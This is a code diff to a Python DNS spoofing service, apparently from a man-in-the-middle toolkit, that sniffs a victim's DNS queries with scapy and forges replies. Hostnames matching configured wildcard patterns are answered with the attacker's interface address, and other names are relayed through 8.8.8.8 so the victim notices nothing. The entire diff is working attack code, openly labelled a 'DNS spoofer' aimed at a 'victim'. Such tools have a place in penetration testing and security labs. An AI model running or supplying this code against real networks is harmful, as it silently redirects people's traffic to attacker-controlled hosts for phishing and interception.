@@ -1,19 +1,21 @@
-from scapy.all import conf, sniff, IP, UDP, DNS, DNSRR, get_if_addr, send, ETH_P_ALL
+import logging
+from scapy.all import conf, sniff, IP, UDP, DNS, DNSRR, get_if_addr, send, ETH_P_ALL, sr1, Ether
+import re
 import socket
-from service import Service
+from services.service import Service
 
 class DNSService(Service):
     def start(self):
-        self.socket = conf.L2listen(
-            type=ETH_P_ALL,
-            iface=self.config.iface,
-            filter= "udp port 53 and src host " + self.config.victim.getIP()
-        )
+        # Bind an actual socket to the dns listen port such that packets will actually arrive properly
+        # after IPTables has applied it's redirect rule
+        sock = socket.socket(socket.AF_INET, # Internet
+                          socket.SOCK_DGRAM) # UDP
+        sock.bind(('0.0.0.0', self.config.dns_listen_port))
 
-        print("Started DNS spoofer")
+        logging.warning("[DNS] Started DNS spoofer")
 
         sniff(
-            opened_socket=self.socket,
+            filter="udp port 53 and src host " + self.config.victim.getIP(),
             prn=self.print_packet,
             stop_filter=self.should_stop_after_packet
         )
@@ -29,24 +31,35 @@ class DNSService(Service):
         # standard (a record) dns query
         if dns.qr == 0 and dns.opcode == 0:
             queried_host = dns.qd.qname[:-1].decode()
-            resolved_ip = get_if_addr(self.config.iface)
+            dns_answer = None
+            match = False
+            for hostname in self.config.hostnames:
+                regex = '^'+ re.escape(hostname).replace('\\*\\*','.*').replace('\\*','[^\.]+') +'$'
+                match = bool(re.match(regex, queried_host))
+                if match:
+                    break
 
-            # Only spoof certain addresses if not *
-            # if self.hostnames != "*":
-            #    if not queried_host in self.hostnames:
-                    # Uncomment:
-                    #return
-                    # Otherwise, we will return the correct ip address
-                    # For the requested hostname
-            #        resolved_ip = socket.gethostbyname(queried_host)
-                    
-            if resolved_ip:
+            if not match:
+                try:
+                    logging.warning("[DNS] Querying: " + queried_host)
+                    dns_req = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=dns.qd)
+                    answer = sr1(dns_req, verbose=0, timeout=3)
+                    answer[DNS].id = dns.id
+                    dns_reply = IP(src=ip.dst, dst=ip.src) / \
+                            UDP(sport=udp.dport,
+                                    dport=udp.sport) / \
+                            answer[DNS]
+                    logging.warning("[DNS] Responding: " + queried_host)
+                    send(dns_reply, iface=self.config.iface, verbose=False)
+                except:
+                    logging.warning("[DNS] Failed to resolve host: " + queried_host)
+            else:
+                resolved_ip = get_if_addr(self.config.iface)
                 dns_answer = DNSRR(rrname=queried_host + ".",
                                         ttl=330,
                                         type="A",
                                         rclass="IN",
                                         rdata=resolved_ip)
-
                 dns_reply = IP(src=ip.dst, dst=ip.src) / \
                             UDP(sport=udp.dport,
                                     dport=udp.sport) / \
@@ -58,8 +71,8 @@ class DNSService(Service):
                                 qd = dns.qd,
                                 an = dns_answer
                             )
+                send(dns_reply, iface=self.config.iface, verbose=False)
 
-                print("Send %s has %s to %s" % (queried_host,
-                                                resolved_ip,
+                logging.debug("[DNS] Sent %s has %s to %s" % (queried_host,
+                                                dns_answer.rdata,
                                                 ip.src))
-                send(dns_reply, iface=self.config.iface)
